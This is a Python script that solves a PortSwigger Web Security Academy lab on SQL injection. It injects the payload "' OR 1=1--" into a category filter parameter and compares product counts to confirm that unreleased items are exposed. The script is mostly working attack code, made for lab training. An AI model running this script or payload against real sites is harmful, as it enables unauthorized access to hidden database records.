# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

# https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def exploit_sqli(s, url, payload):
	print('\n[+] Using payload: %s' % payload)
	r1 = s.get(url)
	time.sleep(1)
	released_count = len(re.findall('productcatalog', r1.text))
	print('[+] Items released in the catalog: %s' % released_count)
	filter_path = url + '/filter?category='
	injection_uri = filter_path + payload
	r2 = s.get(injection_uri)
	time.sleep(1)
	total_count = len(re.findall('productcatalog', r2.text))
	print('[+] Items found in the catalog with injection: %s' % total_count)
	return total_count > released_count


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
	parser = argparse.ArgumentParser(description="[+] Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Retrieving all products in the list (including non-released).\n')
			payload = "' OR 1=1--"
			if exploit_sqli(s, url, payload):
				print('\n[+] SQL Injection successful !')
				time.sleep(5)
				s.cookies.clear()
				s.headers.clear()
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved !')
			else:
				print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
